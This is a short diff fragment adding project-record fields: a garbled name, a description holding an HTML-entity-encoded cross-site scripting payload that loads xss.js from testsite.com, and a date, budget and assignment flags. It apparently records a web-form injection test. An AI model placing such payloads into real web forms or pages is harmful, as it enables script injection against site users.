@@ -1,0 +1,6 @@
+name : wO .W2   .W  C .5..
+desc : &#60;SCRIPT SRC&#61;http&#58;&#47;&#47;testsite.com&#47;xss.js&#62;&#60;&#47;SCRIPT&#62;
+end : 30.6.2016
+budget : 2,573
+assignto[] : 1
+assignme : 1
